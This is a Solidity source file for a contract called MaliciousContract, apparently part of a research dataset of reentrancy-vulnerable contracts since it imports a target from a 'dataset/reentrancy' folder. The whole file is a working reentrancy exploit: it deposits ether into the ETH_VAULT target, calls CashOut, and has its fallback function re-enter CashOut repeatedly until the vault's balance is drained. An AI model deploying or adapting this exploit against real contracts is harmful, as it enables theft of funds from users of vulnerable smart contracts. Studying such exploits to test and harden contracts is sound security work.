pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol";

contract MaliciousContract{
    ETH_VAULT eth_VAULT;
    

    constructor(address _eth_Vault) public{
        eth_VAULT= ETH_VAULT (_eth_Vault);
    }

    function attack() public payable{
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        eth_VAULT.CashOut(msg.value);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        eth_VAULT.Deposit.value(msg.value)();        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(eth_VAULT).balance >= 1 ether) {
            eth_VAULT.CashOut(1 ether);
        }
    }
}